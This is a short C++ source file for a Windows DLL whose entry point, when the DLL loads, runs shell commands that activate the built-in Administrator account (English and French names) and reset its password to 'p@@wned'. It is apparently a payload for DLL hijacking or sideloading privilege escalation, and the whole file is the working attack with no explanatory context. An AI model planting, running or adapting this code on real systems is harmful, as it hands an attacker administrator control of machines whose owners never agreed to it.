#include "windows.h"
#include "iostream"
#include "pch.h"
#include "process.h"

using namespace std; 



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {

    case DLL_PROCESS_ATTACH:
        system("net user Administrateur /active:yes"); 
        system("net user Administrator /active:yes");
        system("net user Administrateur p@@wned > C:\\hh");
        system("net user Administrator p@@wned > C:\\hh2");
        break; 
    case DLL_THREAD_ATTACH:
        break; 
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
        
        
        break;
    }
    return TRUE;
}
